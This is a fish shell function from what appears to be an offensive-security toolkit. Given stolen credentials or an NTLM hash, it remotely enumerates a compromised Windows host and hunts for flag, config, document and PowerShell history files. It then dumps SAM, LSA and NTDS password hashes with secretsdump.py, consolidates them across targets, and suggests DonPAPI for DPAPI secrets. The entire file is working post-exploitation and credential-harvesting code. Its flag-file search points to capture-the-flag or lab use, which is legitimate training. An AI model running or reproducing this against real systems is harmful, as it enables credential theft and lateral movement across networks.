function _ezpz_getloot
    source $EZPZ_HOME/functions/_ezpz_colors.fish

    set -l options 't/target=' 'u/username=' 'p/password=' 'H/hash=' 'd/domain=' 'k/kerberos' 'x/protocol=' 'h/help'
    
    if not argparse $options -- $argv
        return 1
    end
    
    set -l usage "
getloot - Extract information and secrets from a compromised Windows machine

Usage: ezpz loot -t <target> -u <user> -d <domain> [options]

Options:
  -t, --target <ip>         Target IP or hostname (Required)
  -u, --username <user>     Username for authentication (Required)
  -d, --domain <domain>     Domain for authentication (Required)
  -p, --password <pass>     Password for authentication
  -H, --hash <hash>         NTLM hash for pass-the-hash
  -k, --kerberos            Use Kerberos authentication
  -x, --protocol <proto>    Protocol to use (smb/winrm, default: winrm)
  -h, --help                Show this help message

Examples:
  ezpz loot -t 192.168.1.10 -u administrator -H hash -d corp.local
  ezpz loot -t 192.168.1.20 -u domain\\user -p pass -d domain.local
  ezpz loot -t 192.168.1.30 -u user -k -d domain.local
"
    
    if set -q _flag_help
        echo $usage
        return 1
    end
    
    if not set -q _flag_target
        ezpz_error "Target IP required (-t)"
        echo $usage
        return 1
    end
    
    if not set -q _flag_username
        ezpz_error "Username required (-u)"
        echo $usage
        return 1
    end
    
    if not set -q _flag_domain
        ezpz_error "Domain required (-d)"
        echo $usage
        return 1
    end
    
    set -l target $_flag_target
    set -l protocol winrm
    
    if set -q _flag_protocol
        set protocol $_flag_protocol
    end
    
    if not contains $protocol smb winrm
        ezpz_error "Invalid protocol: $protocol. Use smb or winrm"
        echo $usage
        return 1
    end
    
    set -l auth_args
    
    if set -q _flag_username
        set -a auth_args -u $_flag_username
    end
    
    if set -q _flag_password
        set -a auth_args -p $_flag_password
    else if set -q _flag_hash
        set -a auth_args -H $_flag_hash
    end
    
    if set -q _flag_kerberos
        set -a auth_args -k
        if set -q KRB5CCNAME
            set -a auth_args --use-kcache
            ezpz_cmd "Using KRB5CCNAME at $KRB5CCNAME"
        end
        # Time synchronization for Kerberos
        if command -v ntpdate >/dev/null 2>&1
            ezpz_info "Synchronizing clock with DC for Kerberos authentication..."
            sudo ntpdate -u $target >/dev/null 2>&1
        else
            ezpz_warn "ntpdate not found. Skipping time sync. Kerberos may fail if clocks are skewed."
        end
    end

    if set -q _flag_domain
        set -a auth_args -d $_flag_domain
    end
    
    set -l user $_flag_username
    if string match -q "*\\*" $user
        set user (string split '\\' $user)[2]
    end

    # Prerequisites check
    for tool in nxc secretsdump.py
        if not command -v $tool >/dev/null 2>&1
            ezpz_error "Required tool not found: $tool"
            return 1
        end
    end

    # Determine base directory
    set base_dir "."
    if set -q boxpwd
        set base_dir $boxpwd
    end

    # Create secretsdump directory
    set secretsdump_dir "$base_dir/secretsdump"
    if not test -d "$secretsdump_dir"
        mkdir -p "$secretsdump_dir"
        if test $status -ne 0
            ezpz_error "Failed to create directory: $secretsdump_dir"
            return 1
        end
    end

    # Time synchronization for Kerberos
    if set -q _flag_kerberos
        if command -v ntpdate >/dev/null 2>&1
            ezpz_info "Synchronizing time with target for Kerberos authentication..."
            sudo ntpdate -u "$target" >/dev/null 2>&1
        else
            ezpz_warn "ntpdate not found. Skipping time sync. Kerberos may fail if clocks are skewed."
        end
    end

    # Build authentication arguments for nxc
    set -l nxc_args $target $auth_args

    # Determine PowerShell wrapper for SMB
    set pwsh_wrapper ""
    if test "$protocol" = "smb"
        set pwsh_wrapper "cmd /c powershell -c "
    end


    # Section 1: Dumping Machine Information
    ezpz_header "Dumping machine information..."

    ezpz_info "Hostname"
    set cmd "hostname"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'

    ezpz_info "Operating System"
    set cmd "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'

    ezpz_info "Users with home directories"
    set cmd "Get-ChildItem C:/Users -Force | Select-Object Name"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | grep -iv 'Desktop.ini'

    # Section 2: Getting Network Information
    ezpz_header "Getting network information..."

    ezpz_info "Network interfaces"
    set cmd "Get-NetIPConfiguration"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | sed '1,/^$/d' | grep -E "^(InterfaceAlias|IPv4Address|IPv6Address|DefaultGateway)" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v -e '^$'

    ezpz_info "ARP Cache"
    set cmd "arp -a"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v 'Interface' | awk '{print $1}' | sort -V | grep -v -e '^$'

    # Section 3: Extracting Secrets
    ezpz_header "Extracting secrets..."

    ezpz_info "Searching for flag files (flag.txt, user.txt, root.txt)"
    set cmd "Get-ChildItem -Path C:/ -Recurse -Force -Include flag.txt,user.txt,root.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \"=== \$_.FullName ===\"; Get-Content \$_.FullName }"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | sort -u

    ezpz_info "Searching for interesting files in user folders"
    set cmd "Get-ChildItem -Path C:/Users -Force -Recurse -Depth 3 -Include *.config,*.xml,*.json,*.yml,*.yaml,*.log,*.bak,*.old, *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ps1,*.bat, *.exe -ErrorAction SilentlyContinue | Select-Object FullName"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | grep -vi 'appdata' | grep -vi 'local settings' | grep -vi 'application data' | sort -u

    ezpz_info "Extracting shell history (PowerShell and CMD)"
    set cmd "Get-ChildItem -Path C:/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/*.txt -ErrorAction SilentlyContinue | ForEach-Object { Get-Content \$_.FullName -ErrorAction SilentlyContinue }"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'

    # Section 4: SecretsDump.py Integration
    ezpz_header "Dumping credentials with secretsdump.py..."

    # Define output paths
    set secretsdump_output_base "$secretsdump_dir/$target-secrets"
    set this_target_parsed_file "$base_dir/$target-secrets.parsed"
    set all_parsed_hashes_file_root "$base_dir/all-secrets.parsed"
    set tmp_this_target_collection (mktemp)

    # Note: Fish doesn't have trap - cleanup will happen at function end

    ezpz_info "Running secretsdump.py to extract hashes..."

    # Build secretsdump command arguments
    set -l secretsdump_cmd_args
    set -l target_auth_string ""

    # Construct authentication string
    set target_auth_string "$_flag_username"
    if set -q _flag_password
        set target_auth_string "$target_auth_string:$_flag_password"
    end
    set target_auth_string "$target_auth_string@$target"

    set secretsdump_cmd_args $target_auth_string

    # Add authentication flags
    if set -q _flag_hash
        set secretsdump_cmd_args $secretsdump_cmd_args "-hashes" ":$_flag_hash"
    else if set -q _flag_kerberos
        set secretsdump_cmd_args $secretsdump_cmd_args "-k" "-no-pass"
    end

    set secretsdump_cmd_args $secretsdump_cmd_args "-outputfile" "$secretsdump_output_base"

    ezpz_cmd "secretsdump.py $secretsdump_cmd_args"
    secretsdump.py $secretsdump_cmd_args >/dev/null 2>&1

    # Track if any secretsdump output files were produced
    set secretsdump_output_found 0
    if test -f "$secretsdump_output_base.sam" -o -f "$secretsdump_output_base.secrets" -o -f "$secretsdump_output_base.ntds"
        set secretsdump_output_found 1
    end

    if test $secretsdump_output_found -eq 1
        ezpz_info "Extracted secrets for $target found. Parsing and consolidating for this target..."

        # Process .sam file
        if test -f "$secretsdump_output_base.sam"
            ezpz_info "Printing SAM hashes"
            cat "$secretsdump_output_base.sam" | awk -F: '{print $1":"$4}' | tee -a "$tmp_this_target_collection"
        end

        # Process .secrets file (LSA Secrets)
        if test -f "$secretsdump_output_base.secrets"
            ezpz_info "Printing LSA secrets"
            cat "$secretsdump_output_base.secrets"
            # Filter and collect NTLM hashes for consolidation (improved regex to catch special chars)
            cat "$secretsdump_output_base.secrets" | grep -oE '^[^:]+:[^:]*:[0-9a-f]{32}:[0-9a-f]{32}' | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
        end

        # Process .ntds file (NTDS.DIT hashes)
        if test -f "$secretsdump_output_base.ntds"
            ezpz_info "Printing NTDS hashes"
            cat "$secretsdump_output_base.ntds" | awk -F: '{print $1":"$4}' | tee -a "$tmp_this_target_collection"
        end

        # Consolidate all hashes collected for this target
        if test -s "$tmp_this_target_collection"
            sort -u "$tmp_this_target_collection" > "$this_target_parsed_file"
            ezpz_cmd "Parsed hashes for $target saved to '$this_target_parsed_file'."
        else
            ezpz_warn "No hashes extracted or found for $target in SAM/LSA/NTDS files."
        end

        # Consolidate ALL TARGETS' Hashes into all-secrets.parsed
        ezpz_info "Consolidating all collected hashes from all targets..."
        find "$base_dir" -maxdepth 1 -type f -name "*-secrets.parsed" -print0 | xargs -0 cat 2>/dev/null | sort -u > "$all_parsed_hashes_file_root"
        ezpz_cmd "All unique parsed hashes consolidated and saved to '$all_parsed_hashes_file_root'."

    else
        ezpz_error "secretsdump.py did not produce any .sam/.secrets/.ntds files for $target. Check authentication or logs."
    end

    echo ""

    # DonPAPI Suggestion (Next Step)
    if command -v donpapi >/dev/null 2>&1
        set donpapi_auth_arg_string ""
        
        # Reconstruct the authentication argument for donpapi
        if set -q _flag_password
            set donpapi_auth_arg_string "-p $_flag_password"
        else if set -q _flag_hash
            set donpapi_auth_arg_string "-H $_flag_hash"
        end

        if test -n "$donpapi_auth_arg_string"
            ezpz_cmd "Next Step: Try dumping DPAPI master keys and credentials with DonPAPI:"
            ezpz_info "donpapi collect -t $target -u \"$_flag_username\" $donpapi_auth_arg_string --ntfile \"$all_parsed_hashes_file_root\""
        else
            ezpz_warn "DonPAPI suggestion skipped: No password or hash provided for authentication."
        end
    else
        ezpz_warn "DonPAPI not found. Skipping suggestion."
    end

    echo ""

    # Cleanup temporary file
    if test -f "$tmp_this_target_collection"
        rm -f "$tmp_this_target_collection"
    end

    # Finalization
    ezpz_success "Done."
end 